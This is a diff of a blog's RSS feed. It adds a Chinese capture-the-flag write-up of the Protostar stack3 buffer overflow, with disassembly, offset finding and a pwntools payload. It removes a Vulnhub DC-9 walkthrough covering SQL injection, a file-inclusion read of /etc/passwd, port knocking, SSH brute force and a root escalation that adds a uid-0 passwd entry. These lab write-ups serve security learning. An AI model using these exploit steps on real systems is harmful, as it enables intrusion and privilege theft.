@@ -4,9 +4,159 @@
         <title></title>
         <link>undefined</link>
         <description>undefined</description>
-        <lastBuildDate>Tue, 07 Nov 2023 11:32:58 GMT</lastBuildDate>
+        <lastBuildDate>Tue, 07 Nov 2023 12:43:12 GMT</lastBuildDate>
         <docs>https://validator.w3.org/feed/docs/rss2.html</docs>
         <generator>Joplin Pages Publisher</generator>
+        <item>
+            <title><![CDATA[Protostar_stack3]]></title>
+            <guid>3b4e30cf9a634675804df8b7391dd4bf</guid>
+            <pubDate>Tue, 07 Nov 2023 11:37:55 GMT</pubDate>
+            <content:encoded><![CDATA[<p><strong>运行该程序，得到：</strong></p>
+<img src="/_resources/1bb9083030464157b72fb41cd08ab4c8.png" alt="fd20d5017e983f4e3989e72748790aed.png" width="188" height="44" class="jop-noMdConv" />
+<p><strong>checksec:</strong></p>
+<img src="/_resources/56e65f1a1c05409aa56663ac6cd7ad97.png" alt="b4ffe4d135417fa767acccdbc6bb7faa.png" width="286" height="119" class="jop-noMdConv" />
+<p><strong>objdump:</strong></p>
+<div><pre class="hljs"><code>└─$ objdump -t -j .text stack3
+
+stack3:     file format elf32-i386
+
+SYMBOL TABLE:
+08048370 l    d  .text  00000000              .text
+080483a0 l     F .text  00000000              __do_global_dtors_aux
+08048400 l     F .text  00000000              frame_dummy
+080484f0 l     F .text  00000000              __do_global_ctors_aux
+08048480 g     F .text  00000005              __libc_csu_fini
+08048370 g     F .text  00000000              _start
+08048424 g     F .text  00000014              win
+08048490 g     F .text  0000005a              __libc_csu_init
+080484ea g     F .text  00000000              .hidden __i686.get_pc_thunk.bx
+08048438 g     F .text  00000041              main</code></pre></div>
+<p><strong>查看汇编代码:</strong></p>
+<div><pre class="hljs"><code>gdb-peda$ disass main
+Dump of assembler code <span class="hljs-keyword">for</span> function main:
+   <span class="hljs-number">0x08048438</span> &lt;+<span class="hljs-number">0</span>&gt;:     push   ebp
+   <span class="hljs-number">0x08048439</span> &lt;+<span class="hljs-number">1</span>&gt;:     mov    ebp,esp
+   <span class="hljs-number">0x0804843b</span> &lt;+<span class="hljs-number">3</span>&gt;:     and    esp,<span class="hljs-number">0xfffffff0</span>
+   <span class="hljs-number">0x0804843e</span> &lt;+<span class="hljs-number">6</span>&gt;:     sub    esp,<span class="hljs-number">0x60</span>
+   <span class="hljs-number">0x08048441</span> &lt;+<span class="hljs-number">9</span>&gt;:     mov    DWORD PTR [esp+<span class="hljs-number">0x5c</span>],<span class="hljs-number">0x0</span>
+   <span class="hljs-number">0x08048449</span> &lt;+<span class="hljs-number">17</span>&gt;:    lea    eax,[esp+<span class="hljs-number">0x1c</span>]
+   <span class="hljs-number">0x0804844d</span> &lt;+<span class="hljs-number">21</span>&gt;:    mov    DWORD PTR [esp],eax
+   <span class="hljs-number">0x08048450</span> &lt;+<span class="hljs-number">24</span>&gt;:    call   <span class="hljs-number">0x8048330</span> &lt;gets@plt&gt;
+   <span class="hljs-number">0x08048455</span> &lt;+<span class="hljs-number">29</span>&gt;:    cmp    DWORD PTR [esp+<span class="hljs-number">0x5c</span>],<span class="hljs-number">0x0</span>
+   <span class="hljs-number">0x0804845a</span> &lt;+<span class="hljs-number">34</span>&gt;:    je     <span class="hljs-number">0x8048477</span> &lt;main+<span class="hljs-number">63</span>&gt;
+   <span class="hljs-number">0x0804845c</span> &lt;+<span class="hljs-number">36</span>&gt;:    mov    eax,<span class="hljs-number">0x8048560</span>
+   <span class="hljs-number">0x08048461</span> &lt;+<span class="hljs-number">41</span>&gt;:    mov    edx,DWORD PTR [esp+<span class="hljs-number">0x5c</span>]
+   <span class="hljs-number">0x08048465</span> &lt;+<span class="hljs-number">45</span>&gt;:    mov    DWORD PTR [esp+<span class="hljs-number">0x4</span>],edx
+   <span class="hljs-number">0x08048469</span> &lt;+<span class="hljs-number">49</span>&gt;:    mov    DWORD PTR [esp],eax
+   <span class="hljs-number">0x0804846c</span> &lt;+<span class="hljs-number">52</span>&gt;:    call   <span class="hljs-number">0x8048350</span> &lt;<span class="hljs-built_in">printf</span>@plt&gt;
+   <span class="hljs-number">0x08048471</span> &lt;+<span class="hljs-number">57</span>&gt;:    mov    eax,DWORD PTR [esp+<span class="hljs-number">0x5c</span>]
+   <span class="hljs-number">0x08048475</span> &lt;+<span class="hljs-number">61</span>&gt;:    call   eax
+   <span class="hljs-number">0x08048477</span> &lt;+<span class="hljs-number">63</span>&gt;:    leave
+   <span class="hljs-number">0x08048478</span> &lt;+<span class="hljs-number">64</span>&gt;:    ret
+End of assembler dump.
+gdb-peda$ disass win
+Dump of assembler code <span class="hljs-keyword">for</span> function win:
+   <span class="hljs-number">0x08048424</span> &lt;+<span class="hljs-number">0</span>&gt;:     push   ebp
+   <span class="hljs-number">0x08048425</span> &lt;+<span class="hljs-number">1</span>&gt;:     mov    ebp,esp
+   <span class="hljs-number">0x08048427</span> &lt;+<span class="hljs-number">3</span>&gt;:     sub    esp,<span class="hljs-number">0x18</span>
+   <span class="hljs-number">0x0804842a</span> &lt;+<span class="hljs-number">6</span>&gt;:     mov    DWORD PTR [esp],<span class="hljs-number">0x8048540</span>
+   <span class="hljs-number">0x08048431</span> &lt;+<span class="hljs-number">13</span>&gt;:    call   <span class="hljs-number">0x8048360</span> &lt;<span class="hljs-built_in">puts</span>@plt&gt;
+   <span class="hljs-number">0x08048436</span> &lt;+<span class="hljs-number">18</span>&gt;:    leave
+   <span class="hljs-number">0x08048437</span> &lt;+<span class="hljs-number">19</span>&gt;:    ret
+End of assembler dump.</code></pre></div>
+<p><strong>查看反编译代码:</strong></p>
+<div><pre class="hljs"><code><span class="hljs-type">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span>
+{
+    undefined auStack84 [<span class="hljs-number">64</span>];
+    code *pcStack20;
+    
+    pcStack20 = (code *)<span class="hljs-number">0x0</span>;
+    gets(auStack84);
+    <span class="hljs-keyword">if</span> (pcStack20 != (code *)<span class="hljs-number">0x0</span>) {
+        <span class="hljs-built_in">printf</span>(<span class="hljs-string">"calling function pointer, jumping to 0x%08x\n"</span>, pcStack20);
+        (*pcStack20)();
+    }
+    <span class="hljs-keyword">return</span>;
+}</code></pre></div>
+<div><pre class="hljs"><code><span class="hljs-type">void</span> <span class="hljs-title function_">win</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span>
+{
+    <span class="hljs-built_in">puts</span>(<span class="hljs-string">"code flow successfully changed"</span>);
+    <span class="hljs-keyword">return</span>;
+}</code></pre></div>
+<p>本题目是获取输入并传递给 <code>auStack84 [64]</code>数组，由于使用了不安全的<code>gets</code>函数(其并没有检测输入的长度)，所以以输入过长的数据用以达到溢出的目的，从而修改<code>pcStack20</code>的值</p>
+<p>在通过溢出修改<code>pcStack20</code>的值后，就可以进入 <code>if (pcStack20 != (code *)0x0)</code> ，从而执行被修改后的<code>pcStack</code>指向的地址</p>
+<p><strong>接下来，我们获取需要进行溢出的缓冲区的大小：</strong></p>
+<div><pre class="hljs"><code><span class="hljs-meta">gdb-peda$ </span><span class="language-bash">pattern_create 200</span>
+'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA'
+<span class="hljs-meta">gdb-peda$ </span><span class="language-bash">file stack3</span>
+Reading symbols from stack3...
+<span class="hljs-meta">gdb-peda$ </span><span class="language-bash">run</span>
+Starting program: /opt/protostar/bin/stack3 
+[Thread debugging using libthread_db enabled]
+Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
+<span class="hljs-meta">AAA%</span><span class="language-bash">AAsAABAA<span class="hljs-variable">$AAnAACAA</span>-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA</span>
+calling function pointer, jumping to 0x41644141
+。。。。。。
+
+
+[----------------------------------registers-----------------------------------]
+EAX: 0x41644141 ('AAdA')
+EBX: 0xf7e1dff4 --&gt; 0x21dd8c 
+ECX: 0xffffce7c --&gt; 0x7363be00 
+EDX: 0x1 
+ESI: 0x8048490 (&lt;__libc_csu_init&gt;:      push   ebp)
+EDI: 0xf7ffcba0 --&gt; 0x0 
+EBP: 0xffffcf28 ("AA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA")
+ESP: 0xffffcebc --&gt; 0x8048477 (&lt;main+63&gt;:       leave)
+EIP: 0x41644141 ('AAdA')
+EFLAGS: 0x10282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)
+[-------------------------------------code-------------------------------------]
+Invalid $PC address: 0x41644141
+[------------------------------------stack-------------------------------------]
+0000| 0xffffcebc --&gt; 0x8048477 (&lt;main+63&gt;:      leave)
+0004| 0xffffcec0 --&gt; 0x8048560 ("calling function pointer, jumping to 0x%08x\n")
+0008| 0xffffcec4 ("AAdA\350\325\377\367\034")
+0012| 0xffffcec8 --&gt; 0xf7ffd5e8 --&gt; 0xf7fca000 --&gt; 0x464c457f 
+0016| 0xffffcecc --&gt; 0x1c 
+0020| 0xffffced0 --&gt; 0xf7ffcff4 --&gt; 0x32f34 
+0024| 0xffffced4 --&gt; 0xc ('\x0c')
+0028| 0xffffced8 --&gt; 0x0 
+[------------------------------------------------------------------------------]
+Legend: code, data, rodata, value
+Stopped reason: SIGSEGV
+0x41644141 in ?? ()</code></pre></div>
+<p> 可以看到<code>Invalid $PC address: 0x41644141</code></p>
+<p>求其偏移长度：</p>
+<div><pre class="hljs"><code><span class="hljs-meta">gdb-peda$ </span><span class="language-bash">pattern_offset 0x41644141</span>
+1097089345 found at offset: 64</code></pre></div>
+<p>即需要溢出的长度为64,我们还需要win函数的地址，这个已经在上面找到，即<code>0x08048424</code>：</p>
+<div><pre class="hljs"><code><span class="hljs-meta">gdb-peda$ </span><span class="language-bash">disass win</span>
+Dump of assembler code for function win:
+   0x08048424 &lt;+0&gt;:     push   ebp</code></pre></div>
+<p><strong>PS:0x08048424需要写成小端序</strong></p>
+<p>exp如下：</p>
+<div><pre class="hljs"><code>In [<span class="hljs-number">1</span>]: <span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
+
+In [<span class="hljs-number">2</span>]: payload = <span class="hljs-string">'A'</span>*<span class="hljs-number">64</span> + <span class="hljs-string">'\x24\x84\x04\x08'</span>
+
+In [<span class="hljs-number">3</span>]: sh = process(<span class="hljs-string">"./stack3"</span>)
+[x] Starting local process <span class="hljs-string">'./stack3'</span>
+[+] Starting local process <span class="hljs-string">'./stack3'</span>: pid <span class="hljs-number">204414</span>
+
+In [<span class="hljs-number">4</span>]: sh.sendline(payload)
+&lt;ipython-<span class="hljs-built_in">input</span>-<span class="hljs-number">4</span>-96fbe51e0736&gt;:<span class="hljs-number">1</span>: BytesWarning: Text <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-built_in">bytes</span>; assuming ISO-<span class="hljs-number">8859</span>-<span class="hljs-number">1</span>, no guarantees. See https://docs.pwntools.com/<span class="hljs-comment">#bytes</span>
+  sh.sendline(payload)
+
+In [<span class="hljs-number">5</span>]: sh.recvall()
+[x] Receiving <span class="hljs-built_in">all</span> data
+[x] Receiving <span class="hljs-built_in">all</span> data: 0B
+[*] Process <span class="hljs-string">'./stack3'</span> stopped <span class="hljs-keyword">with</span> exit code <span class="hljs-number">31</span> (pid <span class="hljs-number">204414</span>)
+[x] Receiving <span class="hljs-built_in">all</span> data: 79B
+[+] Receiving <span class="hljs-built_in">all</span> data: Done (79B)
+Out[<span class="hljs-number">5</span>]: <span class="hljs-string">b'calling function pointer, jumping to 0x08048424\ncode flow successfully changed\n'</span></code></pre></div>
+<p> </p>
+]]></content:encoded>
+        </item>
         <item>
             <title><![CDATA[Protostar_stack2]]></title>
             <guid>894f3918b46c42ecab439d262be8223b</guid>
@@ -1340,71 +1490,6 @@ proc_close(<span class="hljs-variable">$process</span>);
 }
 
 <span class="hljs-meta">?&gt;</span></code></pre></div>
-]]></content:encoded>
-        </item>
-        <item>
-            <title><![CDATA[vulhub    DC-9]]></title>
-            <guid>5e32b55091c449e084b4d9a059f4a5ca</guid>
-            <pubDate>Wed, 19 Oct 2022 07:20:41 GMT</pubDate>
-            <content:encoded><![CDATA[<p>Download <strong>link：<a title="https://www.vulnhub.com/entry/dc-9,412/" href="https://www.vulnhub.com/entry/dc-9,412/">https://www.vulnhub.com/entry/dc-9,412/</a></strong></p>
-<p><strong>扫描主机，靶机ip为192.168.56.11</strong></p>
-<p><strong><img src="/_resources/c14a748cd4c546f99196ab92e8f7faee.png" alt="de32b30940077a1ff349d8d083c2ac07.png" width="872" height="471" class="jop-noMdConv" /></strong></p>
-<p><strong>靶机开放22和80端口</strong></p>
-<p><strong>访问80端口web服务</strong></p>
-<p><strong><img src="/_resources/b01f9f9ec4564042a576f301e2549ca9.png" alt="40ff85d50fa1e8c7b7f4fd17d54d474c.png" width="873" height="293" class="jop-noMdConv" /></strong></p>
-<p><strong>扫描站点目录</strong></p>
-<p><strong><img src="/_resources/9b2832348f51482db9dc124776f969ba.png" alt="2ba7373b7d450c69a5632cac13c4f19e.png" width="703" height="567" class="jop-noMdConv" /></strong></p>
-<p><strong>访问站点各个页面</strong></p>
-<p><strong><img src="/_resources/c2bdc686819846a0964fa4af105774d5.png" alt="29f5270580d0770da7666ac47593b839.png" width="987" height="539" class="jop-noMdConv" /></strong></p>
-<p><strong>通过测试可以发现search.php页面存在sql注入</strong></p>
-<p><strong>保存请求数据使用sqlmap进行自动化注入</strong></p>
-<p><strong><img src="/_resources/4eb72bf1f2d54fb08de0fcf7f692c856.png" /></strong></p>
-<p><strong>逐个dbs,tables,columns,最后dump数据</strong></p>
-<p><strong>先dump users<img src="/_resources/3289c25787094228be308c95d0cc9211.png" /></strong></p>
-<p><strong>用users库中的表登录web，全部失败</strong></p>
-<p><strong>那么dump Staff库中的数据，发现存在账户密码<code>admin/transorbital1</code>，使用该账户密码成功登录后台</strong></p>
-<p><strong><img src="/_resources/1efb05e8bcc144b197edde462bbefef4.png" /></strong></p>
-<p><strong><img src="/_resources/f5307e037cb241b19cdee31ebf6ea362.png" /></strong></p>
-<p><strong>注意到登录后台后页面下方存在<code>File does not exist</code>的提示，尝试在页面后添加<code>?file=路径</code>，多次尝试，成功读取出/etc/passwd文件</strong></p>
-<p><strong><img src="/_resources/cb3f9205b65f436281485d4c12b7b2c4.png" /></strong></p>
-<p><strong>接下来对文件进行fuzz遍历，查看linux系统中任务调度情况<code>/proc/sched_debug</code></strong></p>
-<p><strong><img src="/_resources/f33a67a9cd7b4520b589c16bd13b9c98.png" /></strong></p>
-<p><strong>发现存在knockd服务，查询得知</strong></p>
-<div><pre class="hljs"><code>敲门（knock）指的是我们从自己的客户端设备（<span class="hljs-built_in">pc</span>、笔记本或者手机）向服务器<span class="hljs-built_in">IP</span>发送一系列实现约好的暗号，而服务器上需要相应的安装接收暗号的服务knockd，它在接收到正确的暗号的时候，会临时性的为敲门者开一段时间的门并随后关上（当然也能够配置成一直开着），我们要在这几秒钟里面登录成功并且保持连接，如果不小心断了连接就要重新敲门。
-
-<span class="hljs-symbol">knock</span>动作的实质就是连续的向指定的<span class="hljs-built_in">ip</span>的约定的端口连续的发送多个tcp或者udp包，比如我们可以通过*telnet 服务器地址 端口号* 命令来发送tcp包，也可以直接在浏览器地址栏里面用 http:<span class="hljs-comment">//服务器地址:端口号 的方式来让浏览器发出与服务器指定端口tcp握手的SYN包。但是最好用的还是直接下载knock工具（windows版、mac版），用 knock 服务器地址 端口号 的方式来实现敲门</span></code></pre></div>
-<p>读取knockd的配置文件<code>/etc/knockd.conf</code>，得到ssh开门密码 <code>9842,8475,7469(倒序)</code></p>
-<p><img src="/_resources/89b26993e1204a02842f8bc130bfafb8.png" /></p>
-<p>安装knockd并对靶机实行ssh开门</p>
-<p><strong><img src="/_resources/87c48adad4aa4cc7ac480408da0d02be.png" alt="6dde7d80df886d0c60e9d4aed8f0d727.png" width="818" height="584" class="jop-noMdConv" /></strong></p>
-<p><strong>使用之前sql注入爆破出来的用户名和密码进行ssh爆破</strong></p>
-<p><strong><img src="/_resources/65903d7169bf4cba9942088804bec244.png" alt="4167d487643ae3c6d4b405bbecebe702.png" width="998" height="341" class="jop-noMdConv" /></strong></p>
-<p><strong>爆破出来三组用户名密码</strong></p>
-<p><strong>其他两个用户都没有什么文件也没有sudo权限，ssh登录janitor发现一个密码txt文件<img src="/_resources/c5e2c1e4bc8e40e58f4b2f8781bb3212.png" /></strong></p>
-<p><strong>使用上面的密码继续进行ssh爆破</strong></p>
-<p><strong><img src="/_resources/7ee501ceefbc4db2ba183498e6c81f8b.png" alt="4f470bf9838244a77c2c1c8e358413ab.png" width="973" height="413" class="jop-noMdConv" /></strong></p>
-<p><strong>得到一个新用户名密码</strong><code>login: fredf password: B4-Tru3-001</code></p>
-<p><strong>ssh登录该用户，查看sudo权限如下</strong></p>
-<p><img src="/_resources/b4354fc41bbd4c2f916f81cee9e5b06d.png" /></p>
-<p><strong>该用户有一个不用root密码就可以执行的文件<code>/opt/devstuff/dist/test/test</code></strong></p>
-<p><strong>执行该test文件，显示test.py</strong></p>
-<div><pre class="hljs"><code>fredf@dc-9:~$ /opt/devstuff/dist/<span class="hljs-built_in">test</span>/<span class="hljs-built_in">test</span> 
-Usage: python test.py <span class="hljs-built_in">read</span> append</code></pre></div>
-<p>切换到<code>/opt/devstuff</code>目录下，找到该test.py文件，如下图</p>
-<p><strong><img src="/_resources/9b62613e345c4cb289400bb938fc2cbd.png" /></strong></p>
-<p><strong>发现这个python脚本的功能是打开一个文件读取信息，追加写入另一个文件中</strong></p>
-<p><strong>那我们构造一个具有root权限的用户并写入passwd文件中，就可以提权</strong></p>
-<div><pre class="hljs"><code>fredf@dc-9:~$ openssl passwd -1 -salt sob 123
-$1$sob<span class="hljs-variable">$BmJLmGFTRiB9Pzlip0Dpa0</span></code></pre></div>
-<p>构造用户<code>sob:$1$sob$BmJLmGFTRiB9Pzlip0Dpa0:0:0::/root:/bin/bash</code></p>
-<div><pre class="hljs"><code>fredf@dc-9:~$ <span class="hljs-built_in">echo</span> <span class="hljs-string">'sob:$1$sob$BmJLmGFTRiB9Pzlip0Dpa0:0:0::/root:/bin/bash'</span> &gt; ./hack.txt
-fredf@dc-9:~$ cat hack.txt 
-sob:$1$sob<span class="hljs-variable">$BmJLmGFTRiB9Pzlip0Dpa0</span>:0:0::/root:/bin/bash</code></pre></div>
-<p>然后写入用户至<code>/etc/passwd</code></p>
-<p><img src="/_resources/e9c3e0fa45534a92853926aab58164db.png" /></p>
-<p><img src="/_resources/b010b1e10bb448ada17146743560fe44.png" /></p>
-<p>切换至sob用户,成功获得root权限</p>
-<p><img src="/_resources/966c76f7ab1f44e6b91aec4aae39b7b2.png" /></p>
 ]]></content:encoded>
         </item>
     </channel>
